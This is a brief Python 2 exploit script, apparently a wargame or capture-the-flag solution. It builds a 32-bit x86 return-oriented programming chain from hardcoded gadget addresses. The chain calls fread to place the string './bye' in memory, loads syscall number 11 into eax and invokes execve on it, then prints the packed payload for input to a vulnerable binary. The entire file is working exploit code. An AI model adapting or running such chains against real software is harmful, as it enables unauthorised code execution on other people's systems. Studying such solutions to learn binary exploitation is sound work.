#!/usr/bin/python
#-*- coding:utf-8 -*-
import struct
place = 0x0804A304
syscall = 0x080482D7
dummy = 0x90909090
# stdin for fread
stdin = 0x0804A31C
fread = 0x08048C60
# pop eax; pop edi; ret
pop_eax = 0x08048755
pop4 = 0x0804839A
pop3 = 0x0804839B
cmd = "./bye\x00"
s = ""
# fread(place, 1, 8, stdin)
s += struct.pack("<I", fread)
s += struct.pack("<I", pop4)
s += struct.pack("<I", place)
s += struct.pack("<I", 1)
s += struct.pack("<I",len(cmd))
s += struct.pack("<I", stdin)
# pop eax for syscall
s += struct.pack("<I", pop_eax)
s += struct.pack("<I", 11)
s += struct.pack("<I", dummy)
# execve(place, 0, 0)
s += struct.pack("<I", syscall)
s += struct.pack("<I", pop3)
s += struct.pack("<I", place)
s += struct.pack("<I", 0)
s += struct.pack("<I", 0)
print (str(len(s)))
print s + cmd

